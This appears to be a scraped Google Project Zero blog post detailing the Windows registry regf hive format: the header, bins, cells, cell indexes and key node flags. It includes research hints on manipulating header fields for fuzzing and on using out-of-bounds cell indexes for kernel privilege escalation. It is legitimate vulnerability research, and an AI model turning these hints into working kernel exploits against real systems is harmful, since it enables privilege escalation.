© 2025 Flexera. All Rights Reserved.

## Footer

* [Privacy Policy](https://www.flexera.com/legal/privacy-policy)
* [Terms and conditions](https://www.flexera.com/legal)
* [Contact Us](https://www.flexera.com/about-us/contact-us)
* [Impressum](https://www.flexera.com/about-us/impressum)
* [Site Map](https://www.flexera.com/sitemap)

#####

×

...



=== Content from googleprojectzero.blogspot.com_8d3d6852_20250126_083142.html ===


# Project Zero

News and updates from the Project Zero team at Google

## Thursday, December 19, 2024

### [The Windows Registry Adventure #5: The regf file format](https://googleprojectzero.blogspot.com/2024/12/the-windows-registry-adventure-5-regf.html)

Posted by Mateusz Jurczyk, Google Project Zero

As previously mentioned in the second installment of the blog post series (["A brief history of the feature"](https://googleprojectzero.blogspot.com/2024/04/the-windows-registry-adventure-2.html)), the binary format used to encode registry hives from Windows NT 3.1 up to the modern Windows 11 is called regf. In a way, it is quite special, because it represents a registry subtree simultaneously on disk and in memory, as opposed to most other common file formats. Documents, images, videos, etc. are generally designed to store data efficiently on disk, and they are subsequently parsed to and from different in-memory representations whenever they are read or written. This seems only natural, as offline storage and RAM come with different constraints and requirements. On disk, it is important that the data is packed as tightly as possible, while in memory, easy and efficient random access is typically prioritized. The regf format aims to bypass the reparsing step – likely to optimize the memory/disk synchronization process – and reconcile the two types of data encodings into a single one that is both relatively compact and easy to operate on at the same time. This explains, for instance, why hives don't natively support compression (but the clients are of course free to store compressed data in the registry). This unique approach comes with its own set of challenges, and has been a contributing factor in a number of historical vulnerabilities.

Throughout the 30 years of the format's existence, Microsoft has never released its official specification. However, the data layout of all of the building blocks making up a hive (file header, bin headers, cell structures) are effectively public through the PDB symbols for the Windows kernel image (ntoskrnl.exe) available on the [Microsoft Symbol Server](https://learn.microsoft.com/en-us/windows-hardware/drivers/debugger/microsoft-public-symbols). Furthermore, the Windows Internals book series also includes a section that delves into the specifics of the regf format (named Hive structure). Lastly, forensics experts have long expressed interest in the format for analysis purposes, resulting in the creation of several unofficial specifications based on reverse engineering, experimentation and deduction. These sources have been listed in my earlier [Learning resources](https://googleprojectzero.blogspot.com/2024/06/the-windows-registry-adventure-3.html) blog post; the two most extensive specifications of this kind can be found [here](https://github.com/libyal/libregf/blob/main/documentation/Windows%2520NT%2520Registry%2520File%2520%28REGF%29%2520format.asciidoc) and [here](https://github.com/msuhanov/regf/blob/master/Windows%2520registry%2520file%2520format%2520specification.md). The intent of this post is not to repeat the information compiled in the existing resources, but rather to highlight specific parts of the format that have major relevance to security, or provide some extra context where I found it missing. A deep understanding of the low-level regf format will prove invaluable in grasping many of the higher-level concepts in the registry, as well as the technical details of software bugs discussed in future blog posts.

## The hive structure: header, bins and cells

On the lowest level, data in hives is organized in chunks of 4 KiB (0x1000 bytes), incidentally the size of a standard memory page in the x86 architecture. The first 4 KiB always correspond to the header (also called the base block), followed by one or more bins, each being a multiple of 4 KiB in length. The header specifies general information about the hive (signature, version, etc.), while bins are an abstraction layer designed to enable the fragmentation of hive mappings in virtual memory – more on that later.

Each bin starts with a 32-byte (0x20) header, followed by one or more cells that completely fill the bin. A cell is the smallest unit of data in a hive that has a specific purpose (e.g. describes a key, value, security descriptor, and so on). The data of a cell is preceded by a 32-bit integer specifying its size, which must be a multiple of eight (i.e. its three least significant bits are clear), and is either in the free or allocated state. A free (unused) cell is indicated by a positive size, and an allocated cell is indicated by a negative one. For example, a free cell of 32 bytes has a length marker of 0x00000020, while an active cell of 128 bytes has its size encoded as 0xFFFFFF80. This visibly demonstrates the hybrid on-disk / in-memory nature of the hive format as opposed to other classic formats, which don't intentionally leave large chunks of unused space in the files.

The overall file structure is illustrated in the diagram below:

[![Pictoral representation of the overall file structure](https://blogger.googleusercontent.com/img/b/R29vZ2xl/AVvXsEiQtJm0XNkozXGxjQnB9n1ka9OuxP7lrLSQN1KZF-Zc60Z06dBEz3AAA8aAYnmdrU4imLebCFvF6qXaE0h-uA_iXnuyAisG90JWawSAMPPaToLdXMGeC4FlyGz42FWkf1bPhJmwSez8Ot-DLI29n4jinIXswZ-LQoLyWX7PIKVF5EwkRoAXNUFYIdcCOwo/s1200/image8.png "Pictoral representation of the overall file structure")](https://blogger.googleusercontent.com/img/b/R29vZ2xl/AVvXsEiQtJm0XNkozXGxjQnB9n1ka9OuxP7lrLSQN1KZF-Zc60Z06dBEz3AAA8aAYnmdrU4imLebCFvF6qXaE0h-uA_iXnuyAisG90JWawSAMPPaToLdXMGeC4FlyGz42FWkf1bPhJmwSez8Ot-DLI29n4jinIXswZ-LQoLyWX7PIKVF5EwkRoAXNUFYIdcCOwo/s1999/image8.png)

In the Windows kernel, internal functions responsible for handling these low-level hive objects (base block, bins, cells) have names starting with "Hv", for example HvCheckHive, HvpAllocateBin or HvpViewMapCleanup. This part of the registry codebase is crucial as it forms the foundation of the registry logic, enabling the Configuration Manager to easily allocate, free, and access hive cells without concerning itself with the technical details of memory management. It is also a place with significant potential for optimizations, such as the incremental logging added in Windows 8.1, or section-based registry introduced in Windows 10 April 2018 Update (RS4). Both of these mechanisms are well described in the Windows Internals 7 (Part 2) book.

While integral to the correct functioning of the registry, hive management does not constitute a very large part of the overall registry-related codebase. In my analysis of the registry code growth shown in blog post #2, I counted 100,007 decompiled lines of code corresponding to this subsystem in Windows 11 kernel build 10.0.22621.2134. Out of these, only 10,407 or around 10.4% correspond to hive memory management. This is also reflected in my findings: out of the 52 CVEs assigned by Microsoft, only two of them were directly related to a Hv\* function implementation – [CVE-2022-37988](https://project-zero.issues.chromium.org/issues/42451463), a logic bug in HvReallocateCell leading to memory corruption, and [CVE-2024-43452](https://project-zero.issues.chromium.org/issues/42451731), a double-fetch while loading hives from remote network shares. This is not to say that there aren't more bugs in this mechanism, but their quantity is likely proportional to its size relative to the rest of the registry-related code.

Let's now have a closer look at how each of the basic objects in the hive are encoded and what information they store, starting with the base block.

### Base block

The base block is represented by a structure called \_HBASE\_BLOCK in the Windows Kernel, and its layout can be displayed in WinDbg:

0: kd> dt \_HBASE\_BLOCK

nt!\_HBASE\_BLOCK

   +0x000 Signature        : Uint4B

   +0x004 Sequence1        : Uint4B

   +0x008 Sequence2        : Uint4B

   +0x00c TimeStamp        : \_LARGE\_INTEGER

   +0x014 Major            : Uint4B

   +0x018 Minor            : Uint4B

   +0x01c Type             : Uint4B

   +0x020 Format           : Uint4B

   +0x024 RootCell         : Uint4B

   +0x028 Length           : Uint4B

   +0x02c Cluster          : Uint4B

   +0x030 FileName         : [64] UChar

   +0x070 RmId             : \_GUID

   +0x080 LogId            : \_GUID

   +0x090 Flags            : Uint4B

   +0x094 TmId             : \_GUID

   +0x0a4 GuidSignature    : Uint4B

   +0x0a8 LastReorganizeTime : Uint8B

   +0x0b0 Reserved1        : [83] Uint4B

   +0x1fc CheckSum         : Uint4B

   +0x200 Reserved2        : [882] Uint4B

   +0xfc8 ThawTmId         : \_GUID

   +0xfd8 ThawRmId         : \_GUID

   +0xfe8 ThawLogId        : \_GUID

   +0xff8 BootType         : Uint4B

   +0xffc BootRecover      : Uint4B

The first thing that stands out is the fact that even though the base block is 4096-bytes long, it only really stores around 236 bytes of meaningful data, and the rest (the Reserved1 and Reserved2 arrays) are filled with zeros. For a detailed description of each field, I encourage you to refer to the two unofficial regf specifications mentioned earlier. In the sections below, I share additional thoughts on the usage and relevance of some of the most interesting header members.

#### Sequence1, Sequence2

These 32-bit numbers are updated by the kernel during registry write operations to keep track of the consistency state of the hive. If the two values are equal during loading, the hive is in a "clean" state and doesn't require any kind of recovery. If they differ, this indicates that not all pending changes have been fully committed to the primary hive file, and additional modifications must be applied based on the accompanying .LOG/.LOG1/.LOG2 files. From a security point of view, manually controlling these fields may be useful in ensuring that the log recovery logic (HvAnalyzeLogFiles, HvpPerformLogFileRecovery and related functions) gets executed by the kernel. This is what I did when crafting the proof-of-concept files for [CVE-2023-35386](https://project-zero.issues.chromium.org/issues/42451598) and [CVE-2023-38154](https://project-zero.issues.chromium.org/issues/42451600).

#### Major, Minor

These are some of the most consequential fields in the header: they represent the major and minor version of the hive. The only valid major version is 1, while the minor version has been historically an integer between 0 and 6. Here is an overview of the different 1.x versions in existence:

| Version | Year | Introduced in | New features |
| --- | --- | --- | --- |
| 1.0 | 1992 | Windows NT 3.1 Pre-Release | Initial format |
| 1.1 | 1993 | Windows NT 3.1 |  |
| 1.2 | 1994 | Windows NT 3.5 | Predefined keys |
| 1.3 | 1995 | Windows NT 4.0 | Fast leaves |
| 1.4 | 2000 | Windows Whistler Beta 1 | Big value support |
| 1.5 | 2001 | Windows XP | Hash leaves |
| 1.6 | 2016 | Windows 10 Anniversary Update | Layered keys |

The later versions draw extensively on the earlier ones both conceptually and in terms of the actual implementation – there are non-trivial portions of code in Windows NT 3.1 Beta that are used to this day in the latest Windows 11. But when it comes to pure binary compatibility, versions 1.0 to 1.2 differ too much from the newer ones and have long been considered obsolete. This leaves us with versions ≥ 1.3, which are all cross-compatible and can be used freely on the current systems. Within this group, version 1.4 was an intermediate step in the development of the format, observed only in beta releases of Windows XP (codenamed Whistler). The other three are all in active use, and can be found in a default installation of Windows 10 and 11:

* 1.3: encodes volatile hives (the root hive, HKLM\HARDWARE), the BCD hive (HKLM\BCD00000000), the user classes hives (HKU\<SID>\_Classes), and some application hives (backed by settings.dat).
* 1.5: encodes a majority of the system hives in HKLM (SYSTEM, SOFTWARE, SECURITY, SAM, DRIVERS), all user hives (HKU\<SID>), and most application hives (backed by ActivationStore.dat).
* 1.6: encodes all differencing hives, i.e. hives used by processes running inside Application and Server Silos, mounted under \Registry\WC.

It is worth noting that the hive version is supposed to be indicative of the features used inside; for example, only hives with versions ≥1.4 should use big values (values longer than 1 MiB), only hives with versions ≥1.5 should use hash leaves, etc. However, this is not actually enforced when loading a hive, and newer features being used in older hives will work completely fine. This behavior may become a problem if any part of the registry code makes any assumptions about the structure of the hive based solely on its version. One example of such a vulnerability was [CVE-2022-38037](https://project-zero.issues.chromium.org/issues/42451465), caused by the fact that the CmpSplitLeaf kernel function determined the format of a subkey list based on the hive version and not the binary representation of the list itself. In general, when writing a registry-specific fuzzer, it might be a good idea to flip the minor version between 3-6 to increase the chances of hitting some interesting corner cases related to version handling.

As a last note, the version number is internally converted to a single 32-bit integer stored in the \_HHIVE.Version structure member using the following formula: Minor+(Major\*0x1000)-0x1000. In the typical case where the major version is 1, the last two components cancel each other out, e.g. version 1.5 becomes simply "5". This would be fine, if not for the fact that a major version of 0 is also allowed by HvpGetHiveHeader, in which case the minor version can be any value greater or equal to 3. Furthermore, if the kernel enters the header recovery path (because the hive header is corrupted and needs to be recovered from a .LOG file), then one can set the major/minor fields to completely arbitrary values and they will be accepted, as HvAnalyzeLogFiles doesn't perform the same strict checks that HvpGetHiveHeader does. Consequently, it becomes possible to spoof the version saved in \_HHIVE.Version and have it take virtually any value in the 32-bit range, but I haven't found any security implications of this behavior, and I'm sharing it simply as a curiosity.

#### RootCell

This is the cell index (offset in the hive file) of the root key, which marks a starting point for the Configuration Manager to parse the hive tree. The root cell is special in many respects: it is the only one in a hive that doesn't have a parent, it cannot be deleted or renamed, its name is unused (it is instead referenced by the name of its mount point), and its security descriptor is treated as the head of the security descriptor linked list. While the RootCell member itself has not been directly involved in any bugs I am aware of, it is worth keeping its special properties in mind when doing registry security research.

#### Length

Specifies the cumulative size of all bins in the hive, i.e. its file size minus 4096 (the size of the header). It is limited to 0x7FFFE000, which reflects the ~2 GiB capacity of the hive stable storage (the part of the hive that resides on disk). Combined with another ~2 GiB of volatile space (in-memory hive data that gets erased on reboot), we get a total maximum size of around 4 GiB when both types of storage space are completely maxed out. Incidentally, that's the same range as a single 32-bit cell index can address.

#### Flags

There are currently only two supported hive flags: 0x1, which indicates whether there are any pending transactions involving the hive, and 0x2, which expresses whether the hive is differencing and contains layered keys or not. The latter flag is typically set when the hive version is 1.6.

#### LastReorganizeTime

In order to address the problem of accumulating fragmentation over time, Windows 8.1 introduced a new mechanism to both shrink and optimize hives during load called reorganization. It happens automatically if the last reorganization took place more than seven days ago and the fragmentation rate of the hive is greater than 1 MiB. Reorganization achieves its goals by starting off with an empty hive and copying all existing keys recursively, taking into account which ones have been used during boot, during system runtime, and not at all since the last reorganization. The end result is that the hive becomes more packed, thanks to the elimination of free cells taking up unnecessary space, and more efficient to operate on, because the "hot" keys are grouped closer together.

As the name suggests, the LastReorganizeTime member stores the timestamp of the last time a successful reorganization took place. From an attacker's perspective, it can be adjusted to control the behavior of the internal CmpReorganizeHive function and deterministically trigger the reorganization or skip it, depending on the desired end result. In addition to indicating a timestamp, the LastReorganizeTime field may also be equal to one of two special marker values: 0x1 to have the hive unconditionally reorganized on the next load, and 0x2 to clear the access bits on all the keys in the hive, i.e. reset the key usage information that has been collected so far.

#### CheckSum

The CheckSum field at offset 0x1FC stores the checksum of the first 508 bytes of the header (i.e. all data prior to this field), and is simply a 32-bit XOR of the header data treated as a series of 127 consecutive DWORDs. If the computed value is equal to 0xFFFFFFFF (-1), then the checksum is set to 0xFFFFFFFE (-2), and if the computed value is 0x0, then the checksum is 0x1. This means that 0 (all bits clear) and -1 (all bits set) are never valid checksum values. If you wish to examine the kernel implementation of the algorithm, you can find it in the internal HvpHeaderCheckSum function.

The checksum is particularly important when making changes to existing hives, either for experimentation or during fuzzing. If any data within the first 508 bytes of the file is modified, the checksum needs to be adjusted accordingly. Otherwise, the system will reject the file early in the loading process with the STATUS\_REGISTRY\_CORRUPT error code, and none of the deeper code paths will be exercised. Therefore, fixing up the checksum is the bare minimum a hive fuzzer should do to maximize its chances of success.

#### Other fields

There are several other pieces of information in the header that carry some value, more so in the context of digital forensics and incident response than strictly low-level system security. For example, "Signature" identifies the file as a regf hive and may make it easier to identify the format in raw memory/disk dumps, while "TimeStamp" indicates the last time the hive has been written to, which can be critical for establishing a timeline of events during an investigation. Furthermore, the [Offline Registry Library](https://learn.microsoft.com/en-us/windows/win32/devnotes/offline-registry-library-portal) (offreg.dll) leaves further traces in the generated hive files: a 4-byte "OfRg" identifier at offset 0xB0 (nominally the Reserved1 field) and a serialization timestamp at offset 0x200 (nominally Reserved2). For more information about the meaning and usefulness of each part of the header, please refer to one of the unofficial format specifications.

### Bins

Bins in registry hives are a simple organizational concept used to split a potentially large hive into smaller chunks that can be mapped in memory independently of each other. Each of them starts with a 32-byte \_HBIN structure:

0: kd> dt \_HBIN

nt!\_HBIN

   +0x000 Signature        : Uint4B

   +0x004 FileOffset       : Uint4B

   +0x008 Size             : Uint4B

   +0x00c Reserved1        : [2] Uint4B

   +0x014 TimeStamp        : \_LARGE\_INTEGER

   +0x01c Spare            : Uint4B

The four meaningful fields here are the four-byte signature ("hbin"), offset of the bin in the file, size of the bin, and a timestamp. Among them, the signature is a constant, the file size is sanitized early in the hive process and effectively also a constant, and the timestamp is not security-relevant. This leaves us with the size as the most interesting part of the header. The only constraints for it is that it must be a multiple of 0x1000, and the sum of the offset and size must not exceed the total length of the hive (\_HBASE\_BLOCK.Length). At runtime, bins are allocated as the smallest 4 KiB-aligned regions that fit a cell of the requested size, so in practice, they typically end up being between 4-16 KiB in size, but they may organically be as long as 1 MiB. While longer bins cannot be produced by the Windows kernel, there is nothing preventing a specially crafted hive from being loaded in the system with a bin of ~2 GiB in size, the maximum length of a hive as a whole. This behavior doesn't seem to have any direct security implications, but more generally, it is a great example of how the hive states written by Windows are a strictly smaller subset of the set of states accepted as valid during loading:

[![Image showing that the states written by the kernel are a subset of states accepted by the hive loader](https://blogger.googleusercontent.com/img/b/R29vZ2xl/AVvXsEgYqh3EsSpb1OQE4B1Z9wJu72kGwf9ucWfyBv7Ydmo3lvQcR9-IGjcLYjeCl4AcC_8Ng9gsCCXKs6gtDparNcaqGlDfuZqkS5OEpkAWqhCwwPpTTLcCi5oi-BsBnzHGAzh_Q4pkzjCrauCEHvz9y1f-6KVaFdVZyp_D58CZIVy8ZL13Uv5LRj7Jytc_qao/s720/image14.png "Image showing that the states written by the kernel are a subset of states accepted by the hive loader")](https://blogger.googleusercontent.com/img/b/R29vZ2xl/AVvXsEgYqh3EsSpb1OQE4B1Z9wJu72kGwf9ucWfyBv7Ydmo3lvQcR9-IGjcLYjeCl4AcC_8Ng9gsCCXKs6gtDparNcaqGlDfuZqkS5OEpkAWqhCwwPpTTLcCi5oi-BsBnzHGAzh_Q4pkzjCrauCEHvz9y1f-6KVaFdVZyp_D58CZIVy8ZL13Uv5LRj7Jytc_qao/s720/image14.png)

### Cells

Cells are the smallest unit of data in registry hives – they're continuous buffers of arbitrary lengths. They do not have a dedicated header structure like \_HBASE\_BLOCK or \_HBIN, but instead, each cell simply consists of a signed 32-bit size marker followed by the cell's data. The size field is subject to the following constraints:

* A cell may be in one of two states – allocated and free – as indicated by the sign of the size value. Positive values are used for free cells, and negative ones for allocated cells.
* The size value accounts for the four bytes occupied by itself.
* The size value must be a multiple of 8 (i.e. have its three lowest bits set to zero). If a cell with size non-divisible by 8 is allocated at runtime, it is aligned up to the next multiple of 8, potentially leading to some unused padding bytes at the end of the cell.
* The sum of all consecutive cells in a bin must be equal to the length of the bin. In other words, the bin header followed by tightly packed cells (with no gaps) completely fill the bin space. If the hive loader detects that this is not the case, it forcefully fixes it by creating a single free cell spanning from the failing point up to the end of the bin. This invariant must subsequently hold for the entire time the hive is loaded in the system.

If cells remind you of heap allocations requested via malloc or HeapAlloc, it is not just your impression. There are many parallels to be drawn between hive cells and heap buffers: both can be allocated and freed, have arbitrary sizes and store a mixture of well-formatted structures and free-form user data. However, there are some significant differences too: heap implementations have evolved to include anti-exploitation mitigations like layout randomization, heap cookies for metadata protection, double-free detection and miscellaneous other consistency checks. On the other hand, hives have none of that: the allocation logic is fully deterministic and doesn't involve any randomness, there is no metadata protection, and generally little to no runtime checks. This is likely caused by the fact that heap chunks have been targets of memory corruption for many decades, whereas the registry was designed with the assumption that once loaded, the hive structure is always internally consistent and intra-hive memory corruption may never occur. This makes the exploitation of certain registry bugs particularly convenient and reliable, as I will demonstrate in future blog posts.

Like a typical memory allocator interface, cells have alloc, realloc, and free functions. Specifically, the internal routines responsible for these tasks in the Windows kernel are HvAllocateCell, HvReallocateCell and HvFreeCell, and reverse-engineering them allowed me to uncover some helpful insights. For instance, I have found that HvAllocateCell and HvReallocateCell reject allocation sizes larger than 1 MiB, and for requests above 16 KiB, they round the size up to the next power of two. Meanwhile, HvFreeCell performs coalescing of free cells, so there should never be two adjacent free cells in an organically created hive. These are some further examples of behavior that is guaranteed on output, but not enforced on input. This is a prevalent pattern in the Windows registry, and I found it useful to keep track of such primitives in my research, even if they didn't seem particularly useful at the time. Thanks to this, I have discovered at least three security bugs closely related to this phenomenon, including one in the interactions between HvReallocateCell and its callers ([CVE-2022-37988](https://project-zero.issues.chromium.org/issues/42451463)).

### Cell indexes

If we equate cells to heap buffers in user-mode applications, then cell indexes would be pointers. Cells rely on these indexes to interrelate within the registry's complex structure. For example, keys reference security descriptors (to control access), their parent key (to navigate the hierarchy), and optionally the list of subkeys and list of values (to organize data). The list of values references specific value records, which in turn reference the actual data backing cells, and so on. This intricate web of relationships is no different from any semi-complex object in a C/C++ program, where pointers link various data structures.

On disk, cell indexes are nothing special: they are simply 32-bit offsets from the start of the hive data (after the 0x1000 byte header), which is a typical way of implementing cross-object references in most file formats. However, it's important to note that a cell index must point to the beginning of a cell (not inside it or in the bin header), and the cell must be in the allocated state – otherwise, the index is considered invalid. So when implementing a read-only regf parser operating on the hive as a contiguous memory block, translating cell indexes is as simple as adding them to the starting address of the hive in memory.

When a hive is loaded in Windows, the management of cell indexes becomes more complex. Hives at rest have a maximum size of 2 GiB, and all of their data is considered stable (persistently stored). On the other hand, an active hive also gains an additional 2 GiB of volatile storage, used for temporary keys and values that reside only in memory. These temporary entries exist only while the hive is loaded (or until the system is shut down) and can be created by calling [RegCreateKeyEx](https://learn.microsoft.com/en-us/windows/win32/api/winreg/nf-winreg-regcreatekeyexw) with the [REG\_OPTION\_VOLATILE](https://learn.microsoft.com/en-us/windows/win32/api/winreg/nf-winreg-regcreatekeyexw%23reg_option_volatile) flag, which designates the key as temporary. To distinguish between these two storage spaces in a cell index, the highest bit serves as an indicator: 0x0 for stable space and 0x1 for the volatile one, resulting in large index values (greater than 0x80000000) that readily identify volatile cells.

But an even bigger complication stems from the fact that hives can shrink and grow at runtime, so it is largely impractical to have them mapped as a single block of memory. To efficiently handle modifications to the registry, Windows maps hives in smaller chunks, which makes the previous method of translating cell indexes obsolete, and necessitates a more sophisticated solution. The answer to the problem are cell maps – pagetable-like structures that divide the 32-bit hive address space into smaller, nested layers, indexed by the respective 1, 10, 9, and 12-bit parts of the 32-bit cell index. Cell maps in the Windows kernel utilize a hierarchical structure consisting of storage arrays, directories, tables, and leaf entries, all defined within the ntoskrnl.exe PDB symbols (the relevant structures are \_DUAL, \_HMAP\_DIRECTORY, \_HMAP\_TABLE and \_HMAP\_ENTRY). The layout of cell indexes and cell maps is illustrated in the diagram below, based on a similar diagram in the Windows Internals book, which itself draws from Mark Russinovich's 1999 article, [Inside the Registry](https://learn.microsoft.com/en-us/previous-versions//cc750583%28v%3Dtechnet.10%29):

[![Cell Index Image](https://blogger.googleusercontent.com/img/b/R29vZ2xl/AVvXsEgCnLfjamN3weVknLoBRSdhrrgxg4incqp0IIvqzjmymKwz39z3wptwKxQYyEpW8Lj15493Nx9sdrcZype51AqDczO8_RJWZEgHNRKoWSA7CXuN70U8_SHvieNxsPbuf6k2L_z10A17wPTxcqr7TqLfAzHfmtKNgEuTRkeiJT_2NPuw5DD6DVWvw_TbSNg/s1200/image11.png "Cell Index Image")](https://blogger.googleusercontent.com/img/b/R29vZ2xl/AVvXsEgCnLfjamN3weVknLoBRSdhrrgxg4incqp0IIvqzjmymKwz39z3wptwKxQYyEpW8Lj15493Nx9sdrcZype51AqDczO8_RJWZEgHNRKoWSA7CXuN70U8_SHvieNxsPbuf6k2L_z10A17wPTxcqr7TqLfAzHfmtKNgEuTRkeiJT_2NPuw5DD6DVWvw_TbSNg/s1999/image11.png)

Cell indexes play a central role in core registry operations, such as creating, reading, updating, and deleting keys and values. The internal kernel function responsible for traversing the cell map and translating cell indexes into virtual addresses is HvpGetCellPaged. In normal conditions, the indexes stay within the bounds of the storage space size (\_HHIVE.Storage[x].Length), so HvpGetCellPaged assumes their validity and doesn't perform any additional bounds checking. However, certain memory corruption vulnerabilities may allow attackers to manipulate these cell indexes at runtime. Crucially, I discovered that out-of-bounds cell indexes can serve as a powerful primitive for exploit development, enabling the construction of proof-of-concept exploits that achieve local elevation of privileges. I will elaborate further on this in future exploit-focused blog posts.

As a last note, the special marker of -1 (0xFFFFFFFF) is used to represent non-existent cells, and can be found in cell indexes pointing at optional data that doesn't exist – basically a hive equivalent of a NULL pointer. The internal name for the constant in the Windows kernel is HCELL\_NIL, and under normal circumstances, it should never be passed directly to HvpGetCellPaged. Doing so without guaranteeing that the cell index is valid first would constitute a bug in the Windows kernel (for example, see [CVE-2023-35357](https://project-zero.issues.chromium.org/issues/42451589) or [CVE-2023-35358](https://project-zero.issues.chromium.org/issues/42451590)).

## Cell types

Now that we have familiarized ourselves with the low-level structure of hives that facilitates their efficient management in memory, let's go a little further and learn about the types of information stored in the cells. These are the objects that actually define the registry tree and all of its properties: keys, values, security descriptors, etc. The first subsection provides a general overview of the various cell types found within a hive and the relations between them. The second one goes into the intricate details of their format and usage within the Windows kernel, uncovering obscure implementation details rarely documented elsewhere.

### Overview of cell types

Registry hives utilize only seven distinct cell types to represent the various data structures within the registry, as outlined below:

1. Key Node: Represents a single registry key and its associated metadata. It is defined by the \_CM\_KEY\_NODE structure and contains references to other cells, including its parent key, security descriptor, class data (optional), and lists of subkeys (stable and volatile) and values (optional).
2. Subkey Index: A variable-length list of key node cell indexes, representing the subkeys of a specific key. For performance reasons, there are four variations of subkey indexes: index leaf, fast leaf, hash leaf, and root index. All are represented by the \_CM\_KEY\_INDEX structure.
3. Security Descriptor: Defines access control information for one or more keys, specifically a security descriptor in a self-relative format. Represented by the \_CM\_KEY\_SECURITY structure, it is the only cell type that can be referenced from multiple key nodes and is therefore reference-counted. It also contains links to the next and previous security descriptors in the hive.
4. Key Value: Defines a single value associated with a key, including its name, type, data length, and a reference to the cell containing the actual data. It is represented by the \_CM\_KEY\_VALUE structure.
5. Big Data: Used to store value data exceeding 16,344 bytes (~16 KiB) in hive versions 1.4 and later. The data is divided into chunks of up to 16 KiB each, allowing for values approaching 1 GiB. The \_CM\_BIG\_DATA structure represents this cell type, containing the number of chunks and a reference to the list of chunk cells.
6. Value List and Chunk List Cells: These cells are simple arrays of 32-bit cell indexes. They are used to store lists of values associated with a key and lists of chunks for large value data.
7. Data Cells: These cells store the raw data associated with keys and values. They hold the optional class data for a key, the complete data for small values (up to 1 MiB in older hives, ~16 KiB in newer hives), and the individual chunks of large values.

The diagram below illustrates the relationships between these cell types:

[![Diagram illustrating the relationships between these cell types](https://blogger.googleusercontent.com/img/b/R29vZ2xl/AVvXsEj9sBOCJ5Wjme99GVbzbKzraCQRVqsJmcNVPeiPTJcQ4N_PipfueQfUEsb3Sfswy0BnxXQuM9iWvq4cjc0A28rJR_Jv5XJ9g99Yszsd8zATyoszpsfWwFCV127-5eNmYAO3V5Atj_pMul6xIMwk6Cm_t6dka6Uyq3xNmCkNa4ok7laVo8kdNXUEE4w_rJc/s1200/image6.png "Diagram illustrating the relationships between these cell types")](https://blogger.googleusercontent.com/img/b/R29vZ2xl/AVvXsEj9sBOCJ5Wjme99GVbzbKzraCQRVqsJmcNVPeiPTJcQ4N_PipfueQfUEsb3Sfswy0BnxXQuM9iWvq4cjc0A28rJR_Jv5XJ9g99Yszsd8zATyoszpsfWwFCV127-5eNmYAO3V5Atj_pMul6xIMwk6Cm_t6dka6Uyq3xNmCkNa4ok7laVo8kdNXUEE4w_rJc/s1999/image6.png)

### Deep dive into each cell type

Now that we know the general purpose of each cell type, it's a good time to dig a little deeper into each of them. This lets us explore both their implementation details, as well as the spirit behind these objects and how they interact with each other in a real-life environment. I have tried my best to avoid repeating the existing unofficial specifications and instead only focus on the security-relevant and sparsely documented aspects of the format, but if any redundant information makes it into this section, please bear with me. 🙂

#### Key nodes

As keys are the most important part of the registry, key nodes are the most important and complex of all cell types. When dumped in WinDbg, the layout of the \_CM\_KEY\_NODE structure is as follows:

0: kd> dt \_CM\_KEY\_NODE /r

nt!\_CM\_KEY\_NODE

   +0x000 Signature        : Uint2B

   +0x002 Flags            : Uint2B

   +0x004 LastWriteTime    : \_LARGE\_INTEGER

   +0x00c AccessBits       : UChar

   +0x00d LayerSemantics   : Pos 0, 2 Bits

   +0x00d Spare1           : Pos 2, 5 Bits

   +0x00d InheritClass     : Pos 7, 1 Bit

   +0x00e Spare2           : Uint2B

   +0x010 Parent           : Uint4B

   +0x014 SubKeyCounts     : [2] Uint4B

   +0x01c SubKeyLists      : [2] Uint4B

   +0x024 ValueList        : \_CHILD\_LIST

      +0x000 Count            : Uint4B

      +0x004 List             : Uint4B

   +0x01c ChildHiveReference : \_CM\_KEY\_REFERENCE

      +0x000 KeyCell          : Uint4B

      +0x008 KeyHive          : Ptr64 \_HHIVE

   +0x02c Security         : Uint4B

   +0x030 Class            : Uint4B

   +0x034 MaxNameLen       : Pos 0, 16 Bits

   +0x034 UserFlags        : Pos 16, 4 Bits

   +0x034 VirtControlFlags : Pos 20, 4 Bits

   +0x034 Debug            : Pos 24, 8 Bits

   +0x038 MaxClassLen      : Uint4B

   +0x03c MaxValueNameLen  : Uint4B

   +0x040 MaxValueDataLen  : Uint4B

   +0x044 WorkVar          : Uint4B

   +0x048 NameLength       : Uint2B

   +0x04a ClassLength      : Uint2B

   +0x04c Name             : [1] Wchar

In the following subsections, each member is discussed in more detail.

##### Signature

This field always stores the special value 0x6B6E, which translates to 'nk' when written in little-endian. It exists for informational purposes only, and isn't used for anything meaningful in the code after the initial sanitization during load.

##### Flags

This is a highly interesting and security-relevant field, as it indicates the role of the key in the hive, and clarifies how certain parts of the key node are formatted. The present and historical flags are presented in the table below together with their names and descriptions:

| Mask | Name | Description |
| --- | --- | --- |
| 0x0001 | KEY\_VOLATILE | (Deprecated) The flag used to indicate that the key and all its subkeys were volatile, but it is obsolete now and hasn't been used in several decades. Information about the key stable/volatile state can be inferred from the highest bit of the key's cell index. |
| 0x0002 | KEY\_HIVE\_EXIT | Indicates that the key is the mount point of another registry hive. These special mount points are used to facilitate attaching new registry hives to the global registry view starting at \Registry in a live system. Exit nodes only ever exist in memory, so hives on disk mustn't have the flag set. More on the subject of mount points and exit nodes can be found in the next section, "Link nodes". |
| 0x0004 | KEY\_HIVE\_ENTRY | Indicates that the given key is the entry to a hive, or in other words, the root of a hive. The flag must be set on the root key of each hive, and mustn't be set on any other nested keys. A hive entry key cannot be a symbolic link (KEY\_SYM\_LINK mustn't be set). |
| 0x0008 | KEY\_NO\_DELETE | Indicates that the key cannot be deleted: any attempt to do so will return the error code STATUS\_CANNOT\_DELETE. This flag is always set on hive exit and hive entry keys, but is not allowed for any other keys. |
| 0x0010 | KEY\_SYM\_LINK | Indicates that the key is a symbolic link, which has been created by specifying the REG\_OPTION\_CREATE\_LINK flag in the [RegCreateKeyEx](https://learn.microsoft.com/en-us/windows/win32/api/winreg/nf-winreg-regcreatekeyexw) call. They are freely accessible and don't come with many restrictions: every key other than a hive exit/entry key can be a symbolic link. However, they are required to adhere to additional structural requirements: they may only contain up to one value, and that value must be of type REG\_LINK (6), named "SymbolicLinkValue", and a maximum of 65534 bytes long (32767 wide characters). |
